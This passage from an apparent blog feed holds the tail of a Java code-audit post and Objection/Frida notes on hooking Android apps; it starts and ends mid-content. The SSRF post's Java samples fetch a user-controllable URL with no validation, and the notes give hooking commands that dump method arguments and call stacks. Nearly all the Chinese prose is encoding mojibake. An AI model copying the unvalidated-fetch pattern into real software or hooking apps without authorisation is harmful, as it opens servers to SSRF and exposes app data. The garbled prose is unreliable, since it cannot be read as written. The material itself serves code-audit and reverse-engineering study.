class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.ssrf;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpURLConnectionSSRF</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//å‡è®¾è¿™é‡Œæ˜¯ç”¨æˆ·å¯æ§çš„URL</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">targetUrl</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1&quot;</span>;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(targetUrl);</span><br><span class="line">            <span class="type">HttpURLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();</span><br><span class="line">            <span class="comment">//è·å–è¾“å…¥æµï¼Œå¹¶è¯»å–å“åº”</span></span><br><span class="line">            <span class="keyword">try</span>(<span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(connection.getInputStream())))&#123;</span><br><span class="line">                String inputLine;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="keyword">while</span>((inputLine = in.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    content.append(inputLine);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(content.toString());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//å…³é—­è¿æ¥</span></span><br><span class="line">            connection.disconnect();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="HttpCLient-execute">HttpCLient.execute</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.ssrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.CloseableHttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.client.methods.HttpGet;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.client.HttpClients;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpClientSSRF</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºHttpClientå®ä¾‹</span></span><br><span class="line">        <span class="keyword">try</span>(<span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClients.createDefault()) &#123;</span><br><span class="line">            <span class="comment">// åˆ›å»ºHttpGetå®ä¾‹</span></span><br><span class="line">            <span class="type">HttpGet</span> <span class="variable">http</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(<span class="string">&quot;http://115.120.233.255:8787&quot;</span>);</span><br><span class="line">            <span class="comment">// æ‰§è¡Œè¯·æ±‚å¹¶è·å–å“åº”</span></span><br><span class="line">            <span class="keyword">try</span>(<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> httpClient.execute(http)) &#123;</span><br><span class="line">                <span class="comment">//æ£€æŸ¥å“åº”çŠ¶æ€ç </span></span><br><span class="line">                <span class="keyword">if</span>(response.getStatusLine().getStatusCode()==<span class="number">200</span>)&#123;</span><br><span class="line">                    <span class="comment">//è¯»å–å“åº”å†…å®¹</span></span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(response.getEntity().getContent()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">body</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                    <span class="keyword">while</span>((line = reader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                        body.append(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(<span class="string">&quot;response body: &quot;</span>+body.toString());</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;request failed: &quot;</span>+response.getStatusLine().getStatusCode());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å…¶å®ƒåŒç†-2">å…¶å®ƒåŒç†</h4><p>æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œå°±ä¸å†ä¸¾ä¾‹ã€‚</p><h2 id="RCE">RCE</h2><p><code>Java</code>ä¸­çš„<code>RCE</code>ä¸­çš„æ–¹å¼ä¸¤ç§ï¼š</p><h3 id="aaa">aaa</h3><h2 id="å‚è€ƒ">å‚è€ƒ</h2><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p><a href="https://www.runoob.com/servlet/servlet-life-cycle.html">https://www.runoob.com/servlet/servlet-life-cycle.html</a> <a href="#fnref1" class="footnote-backref">â†©ï¸</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/9w4Rzr-P1ph41VSCmmc_Hg">https://mp.weixin.qq.com/s/9w4Rzr-P1ph41VSCmmc_Hg</a> <a href="#fnref2" class="footnote-backref">â†©ï¸</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://r17a-17.github.io/2021/09/04/Java-XXEæ¼æ´æ€»ç»“/</a> <a href="#fnref3" class="footnote-backref">â†©ï¸</a></p></li><li id="fn4" class="footnote-item"><p><a href="https://blog.spoock.com/2018/10/23/java-xxe/">https://blog.spoock.com/2018/10/23/java-xxe/</a> <a href="#fnref4" class="footnote-backref">â†©ï¸</a></p></li><li id="fn5" class="footnote-item"><p><a href="https://x2nn.github.io/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/#SSRF%E7%9A%84%E7%BB%95%E8%BF%87">https://x2nn.github.io/2024/07/25/SSRFæ¼æ´ç¯‡/#SSRFçš„ç»•è¿‡</a> <a href="#fnref5" class="footnote-backref">â†©ï¸</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> Java </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> XXE </tag>
            
            <tag> SSRF </tag>
            
            <tag> MyBatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Objectionç¬”è®°</title>
      <link href="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/03/21/Objection%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="ä¸€ã€ç¡®è®¤è¦hookçš„apk">ä¸€ã€ç¡®è®¤è¦hookçš„apk</h3><p>æˆ‘ä½¿ç”¨çš„ç¯å¢ƒæ˜¯çœŸæœºç¯å¢ƒï¼Œä½¿ç”¨<code>USB</code>è¿æ¥æ‰‹æœºã€‚å®‰è£…çš„<code>Objection</code>çš„ç‰ˆæœ¬ä¸º<code>1.11.0</code>ã€‚è¿™é‡Œæ³¨æ„ï¼ŒçœŸæœºçš„<code>frida-server</code>çš„ç‰ˆæœ¬è¦å’Œä½ ç”µè„‘çš„<code>frida</code>ç‰ˆæœ¬ä¸€è‡´ï¼Œæˆ‘æ˜¯ç”¨çš„æ˜¯<code>15.2.2</code>çš„<code>frida</code>ã€‚</p><p>ä½¿ç”¨<code>frida-ps -U</code>æ‰¾åˆ°è‡ªå·±è¦æŸ¥çœ‹çš„åŒ…åï¼Œå¯èƒ½æ˜¯<code>com.x2n.xxx</code>çš„å½¢å¼ä¹Ÿå¯èƒ½æ˜¯ä¸­æ–‡çš„åå­—ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250321235259345.png" alt="image-20250321235259345"></p><p>æ‰¾åˆ°è‡ªå·±çš„åŒ…ï¼Œç„¶åä½¿ç”¨<code>objection -g com.x2n.xxx explore</code>è¿›å…¥åˆ°<code>REPL</code>æ¨¡å¼ã€‚è¿™é‡Œ<code>com.x2n.xxx</code>ä¸ºä¸­æ–‡ä¹Ÿå¯ï¼Œä¸­æ–‡æ—¶æˆ‘ä½¿ç”¨<code>&quot;&quot;</code>è¿›è¡ŒåŒ…è£¹ã€‚æˆ‘ä½¿ç”¨çš„<code>1.11.0</code>çš„<code>objection</code>æ”¯æŒä¸­æ–‡ï¼Œå…¶å®ƒç‰ˆæœ¬æˆ‘ä¸ç¡®å®šã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250321235804595.png" alt="image-20250321235804595"></p><h3 id="äºŒã€å¸¸ç”¨çš„å‘½ä»¤">äºŒã€å¸¸ç”¨çš„å‘½ä»¤</h3><p>è¿›å…¥åˆ°<code>Objection REPL</code>ç•Œé¢<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>ä¸­ï¼Œå½“ä¸çŸ¥é“å‘½ä»¤æ—¶é€šè¿‡æŒ‰ç©ºæ ¼å°±ä¼šæç¤ºå¯ç”¨çš„å‘½ä»¤ã€‚åœ¨å‡ºç°æç¤ºåé€šè¿‡ä¸Šä¸‹é€‰æ‹©é”®åŠå›è½¦é”®ä¾¿å¯ä»¥è¾“å…¥  å‘½ä»¤ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250322000716481.png" alt="image-20250322000716481"></p><p>ä¸‹é¢ä»¥æ‰‹æœºè‡ªå¸¦çš„<code>com.android.phone</code>ä¸ºä¾‹ï¼Œå¼€å§‹ä»‹ç»æ­£å¼çš„ä½¿ç”¨å‘½ä»¤ã€‚</p><h4 id="1ã€helpå‘½ä»¤">1ã€helpå‘½ä»¤</h4><p>å½“ä¸çŸ¥é“å½“å‰å‘½ä»¤çš„æ•ˆæœæ˜¯ä»€ä¹ˆæ—¶ï¼Œåœ¨å½“å‰å‘½ä»¤å‰åŠ ä¸Šhelpï¼ˆæ¯”å¦‚help envï¼‰å†å›è½¦ä¹‹åå°±ä¼šå‡ºç°å½“å‰å‘½ä»¤çš„è§£é‡Šä¿¡æ¯ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323165012672.png" alt="image-20250323165012672"></p><h4 id="2ã€jobså‘½ä»¤">2ã€jobså‘½ä»¤</h4><p>ä½œä¸šç³»ç»Ÿå¾ˆå¥½ç”¨,ç”¨äºæŸ¥çœ‹å’Œç®¡ç†å½“å‰æ‰€æ‰§è¡Œ  Hookçš„ä»»åŠ¡,å»ºè®®ä¸€å®šè¦æŒæ¡,å¯ä»¥åŒæ—¶è¿è¡Œå¤šé¡¹Hookä½œä¸šã€‚</p><h4 id="3ã€å†…å­˜æ¼«æ¸¸ç›¸å…³æŒ‡ä»¤">3ã€å†…å­˜æ¼«æ¸¸ç›¸å…³æŒ‡ä»¤</h4><p>Objectionå¯ä»¥å¿«é€Ÿä¾¿æ·åœ°æ‰“å°å‡ºå†…å­˜ä¸­çš„å„ç§ç±»çš„ç›¸å…³ä¿¡æ¯,è¿™å¯¹Appå¿«é€Ÿå®šä½æœ‰ç€æ— å¯æ¯”æ‹Ÿçš„ä¼˜åŠ¿,ä¸‹  é¢ä»‹ç»å‡ ä¸ªå¸¸ç”¨å‘½ä»¤ã€‚</p><h5 id="ï¼ˆ1ï¼‰åˆ—å‡ºå†…å­˜ä¸­çš„æ‰€æœ‰ç±»">ï¼ˆ1ï¼‰åˆ—å‡ºå†…å­˜ä¸­çš„æ‰€æœ‰ç±»</h5><p>å‘½ä»¤<code>android hooking list classes</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323173058671.png" alt="image-20250323173058671"></p><p>ä¸€å…±æœ‰22110ä¸ªç±»ã€‚</p><h5 id="ï¼ˆ2ï¼‰åœ¨å†…å­˜ä¸­æ‰€æœ‰å·²åŠ è½½çš„ç±»ä¸­æœç´¢åŒ…å«ç‰¹å®šå…³é”®è¯çš„ç±»">ï¼ˆ2ï¼‰åœ¨å†…å­˜ä¸­æ‰€æœ‰å·²åŠ è½½çš„ç±»ä¸­æœç´¢åŒ…å«ç‰¹å®šå…³é”®è¯çš„ç±»</h5><p><code>android hooking search classes display</code></p><p>è¿™é‡Œæœç´¢ä¸€ä¸‹åŒ…å«<code>display</code>å…³é”®è¯çš„ç±»ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323173440288.png" alt="image-20250323173440288"></p><h5 id="ï¼ˆ3ï¼‰ä»å†…å­˜ä¸­æœç´¢æ‰€æœ‰åŒ…å«å…³é”®è¯keyçš„æ–¹æ³•ã€‚">ï¼ˆ3ï¼‰ä»å†…å­˜ä¸­æœç´¢æ‰€æœ‰åŒ…å«å…³é”®è¯keyçš„æ–¹æ³•ã€‚</h5><p><code>android hooking search methods &lt;key&gt;</code></p><p>ä»ä¸Šæ–‡ä¸­å¯ä»¥å‘ç°,å†…å­˜ä¸­å·²åŠ è½½çš„ç±»é«˜è¾¾22110ä¸ªã€‚å®ƒä»¬çš„æ–¹æ³•æ˜¯ç±»çš„ä¸ªæ•°çš„æ•°å€,æ•´ä¸ªè¿‡ç¨‹ä¼šç›¸å½“è€—æ—¶ã€‚</p><p>è¿™é‡Œå±•ç¤ºæœç´¢åŒ…å«displayå…³é”®è¯çš„æ–¹æ³•ã€‚</p><p><code>android hooking search methods display</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323174515328.png" alt="image-20250323174515328"></p><h5 id="ï¼ˆ4ï¼‰æŸ¥çœ‹ç±»çš„æ‰€æœ‰æ–¹æ³•">ï¼ˆ4ï¼‰æŸ¥çœ‹ç±»çš„æ‰€æœ‰æ–¹æ³•</h5><p><code>android hooking list class_methods &lt;className&gt;</code></p><p>éšæ„æ‰¾åˆ°ä¸€ä¸ªç±»<code>com.android.internal.telephony.DisplayInfoControl</code>ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323181548491.png" alt="image-20250323181548491"></p><h3 id="ä¸‰ã€è·å–å››å¤§ç»„ä»¶ç›¸å…³å†…å®¹">ä¸‰ã€è·å–å››å¤§ç»„ä»¶ç›¸å…³å†…å®¹</h3><p><code>Android</code>åŸºç¡€ä¸­çš„åŸºç¡€å°±æ˜¯<code>Android</code>çš„å››å¤§ç»„ä»¶ï¼Œå³æ´»åŠ¨ (<code>Activity</code>) ã€æœåŠ¡(<code>Service</code>) ã€å¹¿æ’­æ¥æ”¶å™¨(<code>Broadcast Receiver</code>)ä»¥åŠå†…å®¹æä¾›è€…(<code>Content Provider</code>)ã€‚</p><p><code>Activity</code>å¯ä»¥ç†è§£ä¸ºç•Œé¢ï¼Œä¸€ä¸ª<code>Activity</code>å°±æ˜¯ä¸€ä¸ªç•Œé¢ï¼›<code>Service</code> ç›¸å½“äºWindowsä¸Šçš„ä¸€ä¸ªåå°è¿›ç¨‹ï¼›<code>Broadcast Receiver</code>ç”¨äºå“åº”æ¥è‡ªå…¶ä»–åº”ç”¨ç¨‹åºæˆ–è€…ç³»ç»Ÿçš„å¹¿æ’­æ¶ˆæ¯ï¼›<code>Content Provider</code>ç”¨äºè¿›ç¨‹é—´çš„äº¤äº’ï¼Œé€šå¸¸é€šè¿‡è¯·æ±‚ä»ä¸€ä¸ªåº”ç”¨ç¨‹åºå‘å…¶ä»–åº”ç”¨ç¨‹åºæä¾›æ•°æ®ã€‚</p><p>ç¬¬äºŒéƒ¨åˆ†ä»‹ç»éƒ½æ˜¯æœ€åŸºç¡€çš„ä¸€äº›<code>Java</code>ç±»ç›¸å…³çš„å†…å®¹ã€‚åœ¨<code>Android</code>ä¸­ï¼Œå››å¤§ç»„ä»¶çš„ç›¸å…³å†…å®¹æ˜¯éå¸¸å€¼å¾—å…³æ³¨çš„ï¼Œ<code>Objection</code>åœ¨è¿™æ–¹é¢ä¹Ÿæä¾›äº†æ”¯æŒï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸‹ã€‚</p><h4 id="1ã€åˆ—å‡ºè¿›ç¨‹æ‰€æœ‰çš„activity">1ã€åˆ—å‡ºè¿›ç¨‹æ‰€æœ‰çš„activity</h4><p><code>android hooking list activities</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323182721262.png" alt="image-20250323182721262"></p><h4 id="2ã€åˆ—å‡ºè¿›ç¨‹æ‰€æœ‰çš„service">2ã€åˆ—å‡ºè¿›ç¨‹æ‰€æœ‰çš„service</h4><p><code>android hooking list services</code></p><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323182756596.png" alt="image-20250323182756596"></p><p>éœ€è¦åˆ—å‡ºå…¶ä»–ä¸¤ä¸ªç»„ä»¶çš„ä¿¡æ¯æ—¶,åªè¦å°†å¯¹åº”çš„åœ°æ–¹æ›´æ¢ä¸º<code>receivers</code>å’Œ<code>providers</code>å³å¯ï¼Œè¿™é‡Œä¸å†æ¼”ç¤ºã€‚</p><h3 id="å››ã€Hookç›¸å…³å‘½ä»¤">å››ã€Hookç›¸å…³å‘½ä»¤</h3><p>ä½œä¸º<code>Frida</code>çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œ<code>Hook</code>æ€»æ˜¯ä¸èƒ½ç»•è¿‡çš„ã€‚åŒæ ·åœ°ï¼Œ<code>Objection</code>ä½œä¸º<code>Frida</code>ä¼˜ç§€çš„å¼€å‘å·¥å…·ï¼Œ<code>Hook</code>ç›¸å…³çš„  å‘½ä»¤æ˜¯ä¸€å®šè¦å®ç°çš„ã€‚äº‹å®ä¸Šï¼Œ<code>Objection</code>åœ¨è¿™æ–¹é¢çš„è¡¨ç°ç¡®å®ä»¤äººç§°èµã€‚</p><h4 id="1ã€å¯¹æŒ‡å®šçš„æ–¹æ³•è¿›è¡ŒHook">1ã€å¯¹æŒ‡å®šçš„æ–¹æ³•è¿›è¡ŒHook</h4><p><code>android hooking watch class_method &lt;methodName&gt;</code></p><p>è¿™é‡Œé€‰æ‹©å¯¹<code>Java</code>ä¸­<code>File</code>ç±»çš„æ„é€ å‡½æ•°è¿›è¡Œ<code>Hook</code>ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><code>android hooking watch class_method java.io.File.$init --dump-args --dump-backtrace --dump-return</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323192008745.png" alt="image-20250323192008745"></p><p>åœ¨ä¸Šè¿°å‘½ä»¤ä¸­ , æˆ‘ä»¬åŠ ä¸Šäº†<code>--dump-args</code>ã€<code>--dumpbacktrace</code>ã€<code>--dump-return</code>ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ç”¨äºæ‰“å°å‡½æ•°çš„å‚æ•°ã€  è°ƒç”¨æ ˆä»¥åŠè¿”å›å€¼ã€‚è¿™ä¸‰ä¸ªå‚æ•°å¯¹é€†å‘åˆ†æçš„å¸®åŠ©æ˜¯éå¸¸å¤§çš„ï¼šæœ‰äº›å‡½æ•°çš„æ˜æ–‡å’Œå¯†æ–‡éå¸¸æœ‰å¯èƒ½æ”¾åœ¨å‚æ•°å’Œè¿”å›å€¼ä¸­ï¼Œè€Œæ‰“å°è°ƒç”¨æ ˆå¯ä»¥è®©åˆ†æè€…å¿«é€Ÿè¿›è¡Œè°ƒç”¨é“¾çš„æº¯æºã€‚</p><p>å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯,æ­¤æ—¶è™½ç„¶åªç¡®å®šäº†<code>Hook</code>æ„é€ å‡½æ•°ï¼Œä½†æ˜¯é»˜è®¤ä¼š<code>Hook</code> å¯¹åº”æ–¹æ³•çš„<code>æ‰€æœ‰é‡è½½</code> ã€‚ åŒæ—¶ï¼Œåœ¨è¾“å‡ºçš„æœ€åä¸€è¡Œæ˜¾ç¤º<code>Registering job 561713</code>ï¼Œè¿™è¡¨ç¤ºè¿™ä¸ª<code>Hook</code>è¢«ä½œä¸ºä¸€ä¸ªâ€œä½œä¸šâ€æ·»åŠ åˆ°<code>Objection</code>çš„ä½œä¸šç³»ç»Ÿä¸­äº†ï¼Œæ­¤æ—¶è¿è¡Œ<code>job list</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹åˆ°è¿™ä¸ªâ€œä½œä¸šâ€çš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾ã€‚å¯ä»¥å‘ç°è¿™é‡Œçš„<code>Job  ID</code>å¯¹åº”çš„æ˜¯<code>561713</code>ï¼ŒåŒæ—¶<code>Hooks</code>å¯¹åº”çš„<code>6</code>æ­£æ˜¯<code>Hook</code>çš„å‡½æ•°çš„æ•°é‡ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323192539602.png" alt="image-20250323192539602"></p><p>å½“æˆ‘åœ¨<code>com.android.phone</code>å¯¹åº”çš„&quot;ç”µè¯&quot;ä¸­è¿›è¡Œæ“ä½œæ—¶ï¼Œä¼šå‘ç°<code>java.io.File.File(java.io.File, java.lang.String)</code>è¿™ä¸€ä¸ªå‡½æ•°è¢«è°ƒç”¨äº†ã€‚åœ¨<code>Backtrace</code>ä¹‹åæ‰“å°çš„è°ƒç”¨æ ˆä¸­ï¼Œå¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°è¿™ä¸ªæ„é€ å‡½æ•°çš„è°ƒç”¨æ¥æºï¼Œå¦‚ä¸‹å›¾ã€‚</p><p>æ³¨æ„ï¼Œè°ƒç”¨æ ˆçš„é¡ºåºæ˜¯ä»ä¸‹è‡³ä¸Šçš„ï¼Œæ ¹æ®<code>Arguments</code>é‚£ä¸€è¡Œä¼šå‘ç°æ‰“å¼€çš„æ–‡ä»¶è·¯å¾„æ˜¯<code>/data/user_de/0/com.android.phone/files</code>ï¼Œæ–‡ä»¶åä¸º<code>persist_atoms.pb</code>ã€‚è™½ç„¶<code>Return Value</code>åæ‰“å°çš„è¿”å›å€¼ä¸º<code>none</code>ï¼Œè¡¨æ˜è¿™ä¸ªå‡½æ•°æ²¡æœ‰è¿”å›å€¼ï¼Œä½†æ˜¯ä¹Ÿæ˜¯çœŸå®åœ°æ‰“å°äº†è¿”å›å€¼ã€‚å½“ç„¶ï¼Œè¯»è€…ä¹Ÿå¯ä»¥<code>Hook</code>å…¶ä»–å‡½æ•°ä»¥æ‰“å°è¿”å›å€¼è¿›è¡Œæµ‹è¯•ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323193322876.png" alt="image-20250323193322876"></p><p>æµ‹è¯•ç»“æŸåï¼Œå¯ä»¥æ ¹æ®&quot;ä½œä¸š&quot;çš„<code>ID</code>æ¥åˆ é™¤&quot;ä½œä¸š&quot;ï¼Œå–æ¶ˆå¯¹è¿™äº›å‡½æ•°çš„<code>Hook</code>ï¼Œæœ€ç»ˆæ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><code>jobs kill &lt;id&gt;</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323195814075.png" alt="image-20250323195814075"></p><h4 id="2ã€å¯¹æŒ‡å®šç±»ä¸­æ‰€æœ‰å‡½æ•°çš„Hook">2ã€å¯¹æŒ‡å®šç±»ä¸­æ‰€æœ‰å‡½æ•°çš„Hook</h4><p>é™¤äº†å¯ä»¥ç›´æ¥<code>Hook</code>ä¸€ä¸ªå‡½æ•°ä¹‹å¤–ï¼Œ<code>Objection</code>è¿˜å¯ä»¥é€šè¿‡æ‰§è¡Œå‘½ä»¤å®ç°å¯¹æŒ‡å®šç±»<code>classname</code>ä¸­æ‰€æœ‰å‡½æ•°çš„Hook**(è¿™é‡Œçš„æ‰€æœ‰å‡½  æ•°å¹¶ä¸åŒ…æ‹¬æ„é€ å‡½æ•°çš„<code>Hook</code>)**ã€‚</p><p><code>android hooking watch class &lt;classname&gt;</code></p><p>åŒæ ·ä»¥<code>java.io.File</code>ç±»ä¸ºä¾‹ï¼Œæœ€ç»ˆæ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323201138858.png" alt="image-20250323201138858"></p><p>ä¸€å…±<code>Hook</code>äº†<code>56</code>ä¸ªå‡½æ•°ï¼Œè¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323201237383.png" alt="image-20250323201237383"></p><p>æœ€ç»ˆ<code>Hook</code>çš„æ•ˆæœå¦‚ä¸‹ã€‚å½“ç„¶ï¼Œè¿™é‡Œçš„è°ƒç”¨é¡ºåºï¼ˆè‡ªä¸Šè€Œä¸‹ï¼‰å’Œä¹‹å‰çš„è°ƒç”¨æ ˆçš„æ‰“å°æ˜¯ä¸åŒçš„ã€‚</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323203121588.png" alt="image-20250323203121588"></p><h3 id="äº”ã€Objectionçš„ä¸»åŠ¨è°ƒç”¨">äº”ã€Objectionçš„ä¸»åŠ¨è°ƒç”¨</h3><p>ä¸»åŠ¨è°ƒç”¨ï¼š<code>android heap</code>ç›¸å…³å‘½ä»¤ã€‚æœ€åä»‹ç»<code>Frida</code>çš„ä¸€å¤§ç‰¹è‰²â€”â€”ä¸»åŠ¨è°ƒç”¨åœ¨<code>Objection</code>ä¸­çš„ä½¿ç”¨ã€‚</p><h4 id="1ã€å®ä¾‹æœç´¢-åŸºäºJava-chooseå®ç°">1ã€å®ä¾‹æœç´¢(åŸºäºJava.chooseå®ç°)</h4><p>åŸºäºæœ€ç®€å•çš„<code>Java.choose</code>çš„å®ç°ï¼Œåœ¨<code>Frida</code>è„šæœ¬ä¸­ï¼Œå¯¹å®ä¾‹çš„æœç´¢åœ¨<code>Objection</code>ä¸­æ˜¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®ç°çš„:</p><p><code>android heap search instances 